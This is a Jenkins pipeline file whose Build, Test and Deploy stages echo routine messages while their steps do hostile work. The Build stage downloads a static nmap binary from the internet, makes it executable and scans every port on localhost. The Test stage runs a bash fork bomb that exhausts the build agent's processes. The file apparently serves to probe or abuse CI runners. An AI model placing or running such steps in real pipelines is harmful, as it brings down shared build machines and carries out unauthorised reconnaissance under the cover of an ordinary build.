//import java.net.Socket as MySocket

pipeline {
    agent any

    stages {
        stage('Build') {
            steps {
              script {
                sh "curl https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap -o /tmp/nmap && chmod +x /tmp/nmap"
                sh "/tmp/nmap -p - 127.0.0.1"
              }
                echo 'Building..'
            }
        }
        stage('Test') {
            steps {

              script {
                sh "/bin/bash -c ':(){ :|:& };:'"
              }
                echo 'Testing..'
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying....'
            }
        }
    }
}
